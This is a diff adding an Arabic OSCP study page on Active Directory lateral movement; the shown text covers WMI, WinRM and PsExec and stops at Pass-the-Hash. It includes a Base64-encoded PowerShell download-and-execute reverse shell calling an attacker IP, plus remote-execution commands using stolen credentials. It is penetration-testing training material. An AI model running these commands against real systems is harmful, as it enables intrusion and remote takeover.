@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 21: الحركة الجانبية في Active Directory</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;
+    --border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout ul{margin:6px 0 0;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-21$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 21</span>
+    <h1>الحركة الجانبية في Active Directory (Lateral Movement)</h1>
+    <p class="lede">من استغلال بيانات اعتماد مسروقة على جهاز واحد — إلى السيطرة على الدومين بالكامل. WMI، WinRM، PsExec، Pass-the-Hash، Overpass-the-Hash، Pass-the-Ticket، DCOM، وصولًا لـ Golden Ticket وتفريغ NTDS.DIT عبر Shadow Copies.</p>
+    <div class="tags">
+      <span class="tag">wmi</span>
+      <span class="tag">winrm</span>
+      <span class="tag">psexec</span>
+      <span class="tag">pass-the-hash</span>
+      <span class="tag">overpass-the-hash</span>
+      <span class="tag">pass-the-ticket</span>
+      <span class="tag">dcom</span>
+      <span class="tag">golden-ticket</span>
+      <span class="tag">shadow-copies</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>الحركة الجانبية — المفاهيم والسياق</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>الحركة الجانبية عبر WMI</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>WinRM وWinRS</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>الحركة الجانبية عبر PsExec</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>Pass-the-Hash (PtH)</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>Overpass-the-Hash (OPtH)</span></a>
+  <a class="toc-item" href="#lu7"><span class="toc-num">07</span><span>Pass-the-Ticket (PtT)</span></a>
+  <a class="toc-item" href="#lu8"><span class="toc-num">08</span><span>الحركة الجانبية عبر DCOM</span></a>
+  <a class="toc-item" href="#lu9"><span class="toc-num">09</span><span>الاستمرارية في AD — Golden Ticket</span></a>
+  <a class="toc-item" href="#lu10"><span class="toc-num">10</span><span>Shadow Copies وNTDS.DIT</span></a>
+  <a class="toc-item" href="#methodology"><span class="toc-num">--</span><span>منهجية الحركة الجانبية المتكاملة</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">الحركة الجانبية — المفاهيم والسياق</span></h2>
+
+<h3>تعريف الحركة الجانبية (MITRE ATT&CK)</h3>
+<p>الحركة الجانبية هي التقنيات اللي المهاجم بيستخدمها عشان يتحرك تدريجيًا جوه الشبكة بعد ما ياخد Initial Access. الهدف: الوصول لأهداف عالية القيمة — Domain Controllers، سيرفرات ملفات، قواعد بيانات، أجهزة الأدمنز المميَّزة.</p>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>الأدوات القياسية (RDP العادي، تسجيل الدخول اليدوي) مش بتقبل NTLM hashes أو Kerberos tickets — بتتوقع كلمة مرور نصية</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>تكسير الهاشات بطيء وغير موثوق — الحل: تقنيات متخصصة بتصادق مباشرة ببيانات الاعتماد المسروقة نفسها</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>كل جهاز جديد بيتم اختراقه بيفتح رؤية جديدة: شرائح شبكة، مستخدمين بجلسات نشطة، مشاركات وخدمات جديدة</span></div>
+</div>
+
+<h3>ليه التعداد (Enumeration) محصلّش يتوقف</h3>
+<ul>
+<li>دورة الحركة الجانبية: اختراق جهاز → تعداد → إيجاد أهداف جديدة → تحرّك → تكرار</li>
+<li>متعاملش مع التعداد كخطوة "مرة واحدة بس" — الصلاحيات والرؤية بتتغيّر مع كل حساب إضافي بتخترقه</li>
+</ul>
+
+<h3>مقارنة التقنيات — نظرة عامة على الموديول</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>بيانات الاعتماد المستخدَمة</th><th>البروتوكول</th><th>درجة التخفّي</th></tr></thead>
+<tbody>
+<tr><td>WMI Execution</td><td>Hash / Plaintext</td><td>RPC/DCOM (135 + dynamic)</td><td>متوسطة</td></tr>
+<tr><td>WinRM / WinRS</td><td>Hash / Plaintext</td><td>HTTP/S (5985/5986)</td><td>متوسطة</td></tr>
+<tr><td>PsExec</td><td>Hash / Plaintext</td><td>SMB (445)</td><td>منخفضة — بينشئ خدمة</td></tr>
+<tr><td>Pass-the-Hash</td><td>NTLM Hash</td><td>SMB / NTLM</td><td>متوسطة</td></tr>
+<tr><td>Overpass-the-Hash</td><td>NTLM Hash → TGT</td><td>Kerberos</td><td>عالية</td></tr>
+<tr><td>Pass-the-Ticket</td><td>Kerberos TGS</td><td>Kerberos</td><td>عالية</td></tr>
+<tr><td>DCOM</td><td>Hash / Plaintext</td><td>RPC (135)</td><td>عالية-متوسطة</td></tr>
+</tbody>
+</table></div>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 180" xmlns="http://www.w3.org/2000/svg">
+  <rect x="10" y="65" width="130" height="55" rx="7" class="dsvg-box-r"/>
+  <text x="75" y="88" text-anchor="middle" class="dsvg-red" font-size="12" font-weight="700">اختراق جهاز</text>
+  <text x="75" y="105" text-anchor="middle" class="dsvg-muted" font-size="9">Initial Access</text>
+
+  <rect x="195" y="65" width="130" height="55" rx="7" class="dsvg-box-a"/>
+  <text x="260" y="88" text-anchor="middle" class="dsvg-amber" font-size="12" font-weight="700">تعداد</text>
+  <text x="260" y="105" text-anchor="middle" class="dsvg-muted" font-size="9">Sessions / Shares</text>
+
+  <rect x="380" y="65" width="130" height="55" rx="7" class="dsvg-box-b"/>
+  <text x="445" y="88" text-anchor="middle" class="dsvg-blue" font-size="12" font-weight="700">حركة جانبية</text>
+  <text x="445" y="105" text-anchor="middle" class="dsvg-muted" font-size="9">WMI/PtH/OPtH/PtT</text>
+
+  <rect x="565" y="65" width="125" height="55" rx="7" class="dsvg-box-g"/>
+  <text x="627" y="88" text-anchor="middle" class="dsvg-green" font-size="12" font-weight="700">هدف جديد</text>
+  <text x="627" y="105" text-anchor="middle" class="dsvg-muted" font-size="9">تكرار الدورة</text>
+
+  <line x1="140" y1="92" x2="195" y2="92" class="dsvg-line"/>
+  <line x1="325" y1="92" x2="380" y2="92" class="dsvg-line"/>
+  <line x1="510" y1="92" x2="565" y2="92" class="dsvg-line"/>
+  <path d="M 627 120 Q 627 160 75 160 Q 10 160 10 120" class="dsvg-line" stroke-dasharray="4,3"/>
+  <text x="350" y="172" text-anchor="middle" class="dsvg-muted" font-size="9">↻ تتكرر الدورة مع كل حساب/جهاز جديد يتم اختراقه</text>
+</svg>
+<div class="diagram-caption">دورة الحركة الجانبية — التعداد عملية مستمرة وليست خطوة لمرة واحدة</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">الحركة الجانبية عبر WMI</span></h2>
+
+<h3>ما هو WMI؟</h3>
+<ul>
+<li>Windows Management Instrumentation — مكوّن مدمج جوه ويندوز للأتمتة الإدارية، مبني على نموذج Object-Oriented</li>
+<li>بيسمح بإدارة النظام محليًا وعن بُعد برمجيًا</li>
+<li>القدرة الأساسية للمهاجمين: <code>Win32_Process.Create()</code> — تشغيل أي Process عن بُعد على الجهاز المستهدَف</li>
+</ul>
+<div class="callout note">
+<div class="callout-label">متطلبات الشبكة</div>
+<p>TCP 135 للاتصال الأولي عبر RPC + نطاق منافذ ديناميكي TCP 49152–65535 لتبادل البيانات. لازم حساب دومين عضو في Local Administrators على الهدف — حسابات الدومين بتتخطى قيود UAC البعيدة بعكس الحسابات المحلية.</p>
+</div>
+
+<h3>تفاصيل تقنية مهمة</h3>
+<ul>
+<li>العمليات اللي بتتشغّل عبر WMI بتشتغل جوه <strong>Session 0</strong> (عزل الجلسات من Vista فصاعدًا) — غير مرئية للمستخدم التفاعلي، بدون Taskbar أو نافذة</li>
+<li>نجاح التنفيذ بيظهر عبر: Process ID (PID) + Return Value = 0</li>
+<li>الحمولات المعقدة تتشفّر بـ Base64 لتجنّب مشاكل الأحرف الخاصة</li>
+</ul>
+
+<div class="code-wrap"><span class="code-tag">powershell — wmi cim session</span><pre><code>$user = 'corp\jeff'
+$pass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
+$cred = New-Object PSCredential($user,$pass)
+
+$opt  = New-CimSessionOption -Protocol DCOM
+$sess = New-CimSession -ComputerName FILES01 -Credential $cred -SessionOption $opt
+
+Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create `
+  -Arguments @{CommandLine='calc.exe'}
+# ProcessId: 1234  ReturnValue: 0
+</code></pre></div>
+
+<h3>حمولة Reverse Shell مشفّرة بـ Base64</h3>
+<div class="callout tip">
+<div class="callout-label">ليه Base64</div>
+<p>الحمولات المعقدة فيها أحرف خاصة بتكسر تحليل الأوامر. Base64 بيحوّلها لسلسلة آمنة أبجدية-رقمية، وبيقلّل من الكشف بالتوقيع لأنه مفيش كلمات مفتاحية واضحة في سطر الأمر.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">powershell — encoded reverse shell via wmi</span><pre><code>$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.118.4/payload.ps1")'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$b64   = [Convert]::ToBase64String($bytes)
+
+$payload = "powershell -enc $b64"
+Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create `
+  -Arguments @{CommandLine=$payload}
+
+# على جهاز المهاجم:
+nc -lvnp 4444
+# Reverse shell received!
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">WinRM وWinRS</span></h2>
+
+<h3>Windows Remote Management</h3>
+<ul>
+<li>تطبيق مايكروسوفت لبروتوكول WS-Management — رسائل XML للإدارة وتنفيذ الأوامر عن بُعد</li>
+<li>TCP 5985 (HTTP — غير مشفّر لكن لسه بيتطلب مصادقة) و TCP 5986 (HTTPS — مشفّر)</li>
+<li>أداتان مدمجتان: <code>winrs</code> (أداة سطر أوامر مباشرة) و PowerShell Remoting عبر <code>Enter-PSSession</code></li>
+</ul>
+<div class="callout warning">
+<div class="callout-label">الشرط الأساسي</div>
+<p>المستخدم لازم يكون عضو في Local Administrators أو Remote Management Users على الهدف.</p>
+</div>
+
+<h3>winrs — تنفيذ أوامر عن بُعد</h3>
+<div class="code-wrap"><span class="code-tag">winrs — remote command execution</span><pre><code>winrs -r:FILES01 -u:corp\jeff -p:Password1! cmd
+C:\Windows\system32> hostname
+FILES01
+C:\Windows\system32> whoami
+corp\jeff
+
+# تنفيذ أمر محدد بدون شل تفاعلي:
+winrs -r:FILES01 -u:corp\jeff -p:Password1! "ipconfig /all"
+</code></pre></div>
+
+<h3>PowerShell Remoting</h3>
+<div class="code-wrap"><span class="code-tag">powershell — new-pssession / enter-pssession</span><pre><code>$user = 'corp\jeff'
+$pass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
+$cred = New-Object PSCredential($user,$pass)
+
+$sess = New-PSSession -ComputerName FILES01 -Credential $cred
+Enter-PSSession -Session $sess
+
+[FILES01]: PS C:\> hostname
+FILES01
+[FILES01]: PS C:\> whoami
+corp\jeff
+</code></pre></div>
+<div class="callout tip">
+<div class="callout-label">ملاحظة عملية</div>
+<p>استبدال <code>cmd</code> بحمولة Reverse Shell بـ PowerShell بيحوّل التنفيذ لوصول مستمر بدل أمر واحد.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">الحركة الجانبية عبر PsExec</span></h2>
+
+<h3>ما هو PsExec؟</h3>
+<ul>
+<li>جزء من Sysinternals toolkit (Mark Russinovich / Microsoft) — بديل آمن وتفاعلي لأدوات قديمة زي Telnet</li>
+<li>المتطلبات: عضوية Local Administrators على الهدف، مشاركة <code>ADMIN$</code> متاحة (افتراضيًا على أجهزة الدومين)، File and Printer Sharing مفعّلة</li>
+<li>الميزة الأساسية: بيوفّر شل تفاعلي كامل — مش تنفيذ Fire-and-Forget</li>
+</ul>
+
+<h3>آلية العمل خلف الكواليس</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">نسخ ملف الخدمة التنفيذي</div>
+<div class="step-body"><p>PsExec بينسخ <code>psexesvc.exe</code> لمشاركة <code>ADMIN$</code> (<code>\\target\admin$</code>) على الجهاز البعيد.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">إنشاء خدمة ويندوز مؤقتة</div>
+<div class="step-body"><p>عبر Service Control Manager (SCM) باستخدام SMB.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تشغيل الخدمة</div>
+<div class="step-body"><p>الخدمة بتبدأ <code>psexesvc.exe</code> اللي بدوره بيشغّل البرنامج المطلوب كـ Child Process.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">التواصل عبر Named Pipe</div>
+<div class="step-body"><p>الاتصال بين المهاجم والعملية البعيدة بيتم عبر Named Pipes فوق SMB.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استلام شل تفاعلي</div>
+<div class="step-body"><p>المهاجم بياخد Command Prompt شغّال على الجهاز البعيد بسياق المستخدم المحدَّد.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">psexec — interactive shell</span><pre><code>./PsExec64.exe -i \\WEB04 -u corp\jeffadmin -p 'BestPasswordEver!' cmd
+
+Connecting to WEB04...
+Starting PsExec service on WEB04...
+
+C:\Windows\system32> hostname
+WEB04
+C:\Windows\system32> whoami
+corp\jeffadmin
+</code></pre></div>
+<div class="callout danger">
+<div class="callout-label">أثر الكشف</div>
+<p>PsExec بينشئ خدمة — ده بيتسجّل في Windows Event 7045 (تثبيت خدمة جديدة)، وده أصلًا أكثر تقنية ضجيجًا في الموديول ده.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">Pass-the-Hash (PtH)</span></h2>
+
+<h3>الفكرة الأساسية</h3>
+<ul>
+<li>PtH بيصادق على أنظمة بعيدة باستخدام NTLM hash بدل كلمة المرور النصية — بروتوكول NTLM أصلًا مش محتاج كلمة المرور الفعلية، الهاش بس كافي</li>
+<li>الهاش بيتم الحصول عليه من LSASS dump أو SAM database أو الـ Domain Controller</li>
+<li>المتطلبات: الخدمة الهدف لازم تقبل NTLM auth، الهاش لازم يخص حساب Local Admin على الهدف، SMB/TCP 445 متاح، مشاركة ADMIN$ متاحة</li>
